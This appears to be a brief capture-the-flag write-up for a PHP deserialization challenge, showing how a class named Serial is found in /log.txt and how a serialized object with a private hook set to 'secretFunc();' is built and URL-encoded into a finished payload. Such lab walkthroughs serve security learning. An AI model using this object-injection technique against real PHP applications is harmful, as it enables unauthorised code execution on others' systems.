Go to /log.txt 
You can see that there is a class named Serial. And there's a secretFunc() which needs to be called.

Creating custom payload:
Start an interactive php shell: php -a

class Serial{
    private $hook="secretFunc();";
}

print urlencode(serialize(new Serial));

Payload: O%3A6%3A%22Serial%22%3A1%3A%7Bs%3A12%3A%22%00Serial%00hook%22%3Bs%3A13%3A%22secretFunc%28%29%3B%22%3B%7D
